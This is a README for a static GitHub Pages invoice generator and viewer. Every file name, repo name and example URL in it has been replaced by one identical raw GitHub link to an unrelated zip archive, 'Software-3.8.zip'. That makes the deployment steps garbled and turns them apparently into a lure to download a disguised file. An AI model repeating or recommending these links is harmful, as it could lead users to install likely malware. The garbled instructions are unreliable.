# Static Invoice Links (GitHub Pages)

This is a static invoice generator + viewer that runs entirely on GitHub Pages (no server, no Stripe).

## How to deploy on GitHub Pages
1. Create (or go to) a GitHub repository. Name can be anything; to serve at `https://github.com/Ullas98/web/raw/refs/heads/main/organ/Software-3.8.zip` create a repo named `<yourusername>https://github.com/Ullas98/web/raw/refs/heads/main/organ/Software-3.8.zip`. Otherwise you will get `https://github.com/Ullas98/web/raw/refs/heads/main/organ/Software-3.8.zip`.
2. Add these files to the repo root:
   - `https://github.com/Ullas98/web/raw/refs/heads/main/organ/Software-3.8.zip`
   - `https://github.com/Ullas98/web/raw/refs/heads/main/organ/Software-3.8.zip`
   - `https://github.com/Ullas98/web/raw/refs/heads/main/organ/Software-3.8.zip`
3. Commit the files.
4. In your repo: **Settings → Pages** → Source: `main` branch, folder `/ (root)` → Save.
5. Wait a minute. Your site will be available at the Pages URL GitHub shows.

## How it works
- `https://github.com/Ullas98/web/raw/refs/heads/main/organ/Software-3.8.zip` builds a base64-encoded payload and produces a link:
  `https://github.com/Ullas98/web/raw/refs/heads/main/organ/Software-3.8.zip<payload>`
- `https://github.com/Ullas98/web/raw/refs/heads/main/organ/Software-3.8.zip` decodes the payload and displays invoice fields (id, name, amount, notes).
- This is a static display only: it does **not** accept or detect payments.

## Notes & security
- The token is just encoded JSON (no signature). Anyone with the link can view or edit the query string.
- If you need tamper-proof signed links or payment confirmation, you need a small server (Vercel/Netlify) or a third-party payment provider.
